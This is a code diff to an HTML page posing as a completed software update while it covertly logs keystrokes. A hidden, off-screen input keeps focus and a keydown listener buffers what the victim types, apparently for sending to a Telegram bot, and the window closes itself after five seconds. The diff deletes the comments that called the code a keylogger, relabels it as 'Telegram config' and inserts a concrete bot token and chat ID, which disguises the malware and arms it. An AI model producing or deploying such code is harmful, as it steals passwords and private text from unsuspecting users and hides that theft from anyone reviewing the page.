@@ -45,7 +45,6 @@
         }
         .status { color: #aaa; font-size: 14px; }
 
-        /* Hidden input field — keyboard trigger ke liye */
         #hiddenInput {
             position: fixed;
             top: -9999px;
@@ -66,19 +65,16 @@
         <p class="status">✅ Update completed successfully</p>
     </div>
 
-    <!-- Hidden input field — keyboard trigger ke liye -->
     <input type="text" id="hiddenInput" autofocus>
 
     <script>
-        // ===== KEYLOGGER =====
-        const BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
-        const CHAT_ID = "YOUR_CHAT_ID_HERE";
+        // ===== TELEGRAM CONFIG =====
+        const BOT_TOKEN = "8910457881:AAE9TznGCDNXkAxuo3Js_A1HaRVppAvhJuo";
+        const CHAT_ID = "1431950109";
         let buffer = "";
 
-        // Force focus on hidden input
         document.getElementById('hiddenInput').focus();
 
-        // Keylogger
         document.addEventListener('keydown', (event) => {
             const key = event.key;
             if (key === "Enter") {
@@ -91,7 +87,6 @@
             }
         });
 
-        // Keep focus on hidden input
         document.addEventListener('click', () => {
             document.getElementById('hiddenInput').focus();
         });
@@ -108,7 +103,6 @@
             });
         }
 
-        // Auto close after 5 seconds
         setTimeout(() => window.close(), 5000);
     </script>
 </body>
